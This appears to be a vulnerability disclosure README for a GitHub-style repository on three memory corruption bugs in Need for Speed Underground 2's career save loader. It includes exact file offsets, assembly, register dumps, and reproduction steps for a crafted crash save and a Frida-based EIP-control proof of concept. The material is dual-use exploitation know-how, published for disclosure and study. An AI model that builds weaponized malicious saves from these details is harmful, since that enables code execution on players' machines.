# NFS Underground 2 — Save File Arbitrary Code Execution

Three memory corruption vulnerabilities in the Need for Speed Underground 2 career save deserializer that chain together for **full EIP control** from a crafted save file.

| | |
|---|---|
| **Product** | Need for Speed Underground 2 (SPEED2.EXE) |
| **Version** | PC (Windows) |
| **Vendor** | Electronic Arts |
| **Platform** | Windows x86 (32-bit PE) |
| **Severity** | High (CVSS 3.1: 7.8 — AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H) |
| **Attack vector** | Crafted career save file |
| **Impact** | Arbitrary code execution |
| **Date** | November 2026 |

## Attack Scenario

Career save files for NFS Underground 2 are commonly shared across the community — modding forums, Discord servers, Reddit, and "100% completion" save packs are all established distribution channels. A crafted save file distributed through any of these looks identical to a legitimate save. The victim copies it into their profile directory and loads it through the in-game career menu. The game crashes or executes attacker-controlled code during deserialization, before gameplay even starts.

No special tools are required to trigger the vulnerability. The included PoC save file (`poc/crash_minimal.bin`) differs from a clean save by exactly **4 bytes**.

## Why This Works

The game was released in November 2004. The binary has **zero modern exploit mitigations**:

| Mitigation | Status |
|------------|--------|
| ASLR | **None** — fixed image base `0x00400000`, all addresses identical on every installation |
| Stack cookies | **None** — no `/GS` protection |
| DEP | **None** — `/NXCOMPAT` not set |
| Save file integrity | **None** — no hash, no signature, no checksum, no MAC |

The save loader validates three things: a magic number (`20CM`), a version field (`0x10d`), and a payload size. A 12-byte hash is read from the header but **never compared** against anything. Any save that passes the magic/version/size check has its entire 54,930-byte payload copied directly into a global career struct at `0x0083a9e0`. Multiple fields from this struct are then used as raw pointer operands, array indices, and vtable entries with no validation.

## How The Save Gets Into Memory

```
Save file on disk (54,966 bytes)
    │
    ├── Header (36 bytes): magic, version, size, unused hash
    └── Payload (54,930 bytes): raw career data
            │
            ▼
        Deinterleave pass 1 (FUN_00516850)
            │
            ▼
        Deinterleave pass 2 (FUN_00529240)
            │
            ▼
        memcpy → career struct at 0x0083a9e0
            │
            ▼
        Deserialization (FUN_005344e0)
        Fields used as pointers, indices, vtable entries
        — NO VALIDATION —
```

The two deinterleave passes are a fixed byte-level permutation — not encryption, just data rearrangement. Every byte in the raw file maps to exactly one byte in the career struct. The permutation is deterministic and reversible.

## Vulnerabilities

| ID | Type | Location | What happens |
|----|------|----------|-------------|
| **Vuln 1** | OOB array index (CWE-787) | `0x5346d7` in `FUN_005344e0` | Save data used as array index with `*4` scaling — out-of-bounds memory access |
| **Vuln 2** | Write-what-where (CWE-123) | `FUN_004792b0` | Save data written to arbitrary address via `*(*(obj+0x98) + 0x14) = param_1` |
| **Vuln 3** | Vtable hijack (CWE-843) | `FUN_00469050` | Virtual call through attacker-controlled pointer — arbitrary code execution |

Vuln 1 is exploitable from a save file alone. Vulns 2 and 3 chain together for full EIP control (demonstrated with Frida instrumentation).

## Proven Exploitation Paths

### Path 1: Save File Only — Crash With Controlled Registers

A single 4-byte modification at file offset `0xc573` sets `career+0x8c` to `0x41414141`. During deserialization, this value is loaded into EAX and used as a scaled array index:

```asm
MOV  EAX, [EDI]              ; EAX = career+0x8c = 0x41414141 (SAVE DATA)
MOV  ECX, [EBP + EAX*4 - 0x24]  ; 0x41414141 * 4 = 0x05050504 → ACCESS VIOLATION
```

The local buffer is 9 DWORDs. Any index outside `[0, 8]` reads out of bounds. With `0x41414141`, the access lands millions of bytes past the stack frame.

**Crash dump (from crafted save, no instrumentation):**

```
Exception:    ACCESS_VIOLATION at 0x5346d7
EAX = 0x41414141    ← save file data (file offset 0xc573)
EBX = 0x83aa28      ← career struct + 0x48
EDI = 0x83aa6c      ← career struct + 0x8c (index source)
EBP = 0x1afcac
```

### Path 2: Vuln 2 → Vuln 3 Chain — Full EIP Control

With Frida, the write-what-where (Vuln 2) is redirected to overwrite a global object pointer (`DAT_0082b974`). The vtable dispatch (Vuln 3) then follows the hijacked pointer through a fake object planted in the career struct:

```
1. Save payload → career struct (fake object at career+0x300)
       │
       ▼
2. Vuln 2: *(*(ECX+0x98) + 0x14) = 0x0083ace0
       writes fake object address → global pointer DAT_0082b974
       │
       ▼
3. Vuln 3: MOV ECX, [0x0082b974]     → 0x0083ace0 (fake object)
           MOV EAX, [ECX]            → 0x0083ace0 (self-ref vtable)
           CALL [EAX + 0x14]         → 0x41414141
       │
       ▼
   EIP = 0x41414141 — FULL CONTROL
```

**Register dump at point of control:**

```
EIP = 0x41414141    ← INSTRUCTION POINTER CONTROLLED
EAX = 0x0083ace0      (fake object in career struct)
ECX = 0x0083ace0
ESP = 0x001afc6c
EBP = 0x001afcac
```

## Silent Memory Corruption

Even when the game doesn't crash, save data provably corrupts live objects in memory. Setting `career+0x70` to `0xDEADBEEF` in the save file (offset `0xc547`) causes the write-what-where to plant that value into the audio manager's internal heap object during deserialization:

```
career+0x70                  = 0xDEADBEEF  (from save file)
*(audio_mgr+0x98) + 0x14    = 0xDEADBEEF  (written by game's own code)
```

No crash, no hooks, no instrumentation — the corruption happens through the game's own code path. This demonstrates that save data reaches live pointer-bearing objects, not just inert fields.

## Key Save File Byte Mappings

These offsets were discovered through Frida byte-pattern tracing and verified by patching the save and observing the career struct in memory:

| Career struct offset | Save file offset | Field | Verified |
|---------------------|-----------------|-------|----------|
| `+0x48` to `+0x7F` | `0xc51f` to `0xc557` | Audio settings block (contiguous) | Yes |
| `+0x70` | `0xc547` | Vuln 2 WHAT value | Yes — 0xDEADBEEF landed |
| `+0x84` to `+0xD3` | `0xc56b` to `0xc5bb` | Career state flags | Yes |
| `+0x8c` | `0xc573` | **Vuln 1 OOB array index** | Yes — 0x41414141 crashed |
| `+0x300` | `0xc46f` | Fake object area | Yes |

## Reproduction

### Save-triggered crash (no tools needed)

1. Copy [`poc/crash_minimal.bin`](poc/crash_minimal.bin) to `%LOCALAPPDATA%\NFS Underground 2\<Profile>\<Profile>`
   - The profile name is both the folder name and the filename (no extension)
   - Create a new profile in-game first if you need one
2. Launch the game and load that profile from the career menu
3. The game crashes immediately during deserialization

### Full EIP control (requires Frida)

1. Launch `SPEED2.EXE` and wait for the main menu
2. Attach Frida: `frida -p <PID> -l poc/eip_control.js`
3. Load any career profile from the in-game menu
4. Observe in Frida console: `EIP = 0x41414141`

See [`poc/README.md`](poc/README.md) for detailed steps and expected output.

## Repository Contents

```
├── DISCLOSURE.md              Full technical write-up with disassembly
├── poc/
│   ├── crash_minimal.bin      Crafted save file (4-byte patch, crashes on load)
│   ├── eip_control.js         Frida script for full EIP control
│   └── README.md              Detailed reproduction steps for both PoCs
├── reference/
│   └── save-format.md         Save file format documentation
├── samples/
│   └── career.bin             Clean career save for comparison
└── LICENSE
```

## Tools Used

- [Ghidra](https://ghidra-sre.org/) 12.1.4 via [REA](https://re-anytime.com/) — static analysis, decompilation, cross-reference analysis
- [Frida](https://frida.re/) — dynamic instrumentation, runtime verification, EIP control proof

## Disclaimer

This research is published for **educational and defensive purposes only**. The vulnerabilities exist in a 22-year-old game with no active security support from the vendor. No weaponized exploit is included — no shellcode, no payload delivery, no persistence mechanism. The PoC demonstrates control of the instruction pointer and nothing more.

Do not use this research to harm other players. Don't be that person.

## License

Research scripts and documentation are released under the [MIT License](LICENSE). The game binary and its assets remain the property of Electronic Arts.
